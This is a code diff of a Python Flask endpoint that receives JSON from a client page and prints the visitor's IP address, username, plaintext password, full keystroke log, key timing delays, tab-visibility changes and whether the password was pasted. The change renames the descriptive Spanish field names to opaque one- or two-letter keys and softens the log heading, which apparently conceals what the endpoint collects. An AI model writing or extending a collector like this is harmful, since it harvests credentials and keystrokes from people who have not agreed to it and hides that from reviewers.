@@ -1,23 +1,22 @@
 from flask import Flask, request
-import datetime
 
 app = Flask(__name__)
 
 @app.route('/_api_/', methods=['POST'])
 def log_behavior():
-    data = request.get_json()
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    d = request.get_json()
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    print("\\n>> Comportamiento del usuario detectado:")
-    print(f"IP: {user_ip}")
-    print(f"Usuario: {data.get('usuario')}")
-    print(f"Clave: {data.get('clave')}")
-    print(f"Teclas: {data.get('teclas')}")
-    print(f"Tiempo total escribiendo: {data.get('tiempo_total')} ms")
-    print(f"Cantidad de backspaces: {data.get('backspaces')}")
-    print(f"Cambios de pestaña: {data.get('cambio_pestanas')}")
-    print(f"¿Pegó la clave?: {'Sí' if data.get('pegado_clave') else 'No'}")
-    print(f"Tiempos entre teclas: {data.get('tiempos_teclas')}\\n")
+    print("\n>> Registro de actividad detectado:")
+    print(f"IP: {ip}")
+    print(f"U: {d.get('u')}")
+    print(f"C: {d.get('c')}")
+    print(f"T: {d.get('t')}")
+    print(f"TT (tiempo total): {d.get('tt')} ms")
+    print(f"B (backspaces): {d.get('b')}")
+    print(f"VC (cambios de visibilidad): {d.get('vc')}")
+    print(f"PC (¿pegado?): {'Sí' if d.get('pc') else 'No'}")
+    print(f"KD (key delays): {d.get('kd')}\n")
 
     return '', 204
 
